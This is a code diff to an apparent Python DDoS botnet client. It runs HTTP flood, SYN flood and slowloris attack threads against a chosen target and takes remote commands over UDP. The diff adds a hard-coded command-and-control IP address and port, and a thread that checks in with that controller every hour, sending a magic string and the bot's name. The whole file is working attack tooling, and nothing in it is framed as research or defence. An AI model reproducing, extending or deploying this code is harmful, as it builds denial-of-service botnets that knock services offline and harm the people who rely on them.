@@ -6,9 +6,10 @@ Created on Fri Jun  8 09:38:27 2018
 """
 
 from httpflood import sendGET
-from slowloris import sendSYN as slowLoris
+from slowloris import sendSlow
 from synflood import sendSYN
 
+import time
 import socket
 import sys
 import threading
@@ -19,6 +20,10 @@ PORT_DEFAULT = 2337
 SYNFLOOD_THREAD_DEFAULT = 0
 SLOWLORIS_THREAD_DEFAULT = 0
 HTTPFLOOD_THREAD_DEFAULT = 0
+MANAGE_PORT = 2341
+MANAGE_IP = '47.94.138.231'
+botname = 'BOT'
+
 
 port = None
 n_httpflood = None
@@ -85,10 +90,28 @@ class main_threads(threading.Thread):
                     #print (sendSYN.THREAD)
                     tmp = sendSYN(tgt_ip, tgt_port)
                     tmp.start()
-                if slowLoris.THREAD < n_slowloris:
+                if sendSlow.THREAD < n_slowloris:
                     #print (slowLoris.THREAD)
-                    tmp = slowLoris(tgt_ip, tgt_port)
+                    tmp = sendSlow(tgt_ip, tgt_port)
                     tmp.start()
+            except:
+                exit(0)
+
+
+class manage_contact_thread(threading.Thread):
+
+    def run(self):
+        print ("Manage contact thread")
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((MANAGE_IP,MANAGE_PORT))
+                s.send(("142857"+str(botname)+'  ').encode())
+                s.recv(1024)
+                s.close()
+                time.sleep(3600)
+                #print (str(n_httpflood)+" "+str(n_synflood)+" "+str(n_slowloris))
+
             except:
                 exit(0)
         
@@ -121,7 +144,7 @@ class monitor_thread(threading.Thread):
                 s.sendto(bytes(data[4:].strip(), encoding="utf-8"), addr)  
             if data == 'STATUS':
                 status = str(sendGET.THREAD)+" "+str(sendSYN.THREAD)+\
-                    " "+str(slowLoris.THREAD)
+                    " "+str(sendSlow.THREAD)
                 s.sendto(bytes(status, encoding="utf-8"), addr)  
     
 if __name__ == "__main__":
@@ -135,9 +158,12 @@ if __name__ == "__main__":
     n_slowloris = SLOWLORIS_THREAD_DEFAULT
     monitor = monitor_thread()
     main = main_threads()
+    manage_contact = manage_contact_thread()
     t1 = threading.Thread(target=main.run)
     t2 = threading.Thread(target=monitor.run)
+    t3 = threading.Thread(target=manage_contact.run)
     t1.setDaemon(True)
     #t2.setDaemon(True)
     t1.start()
     t2.start()
+    t3.start()
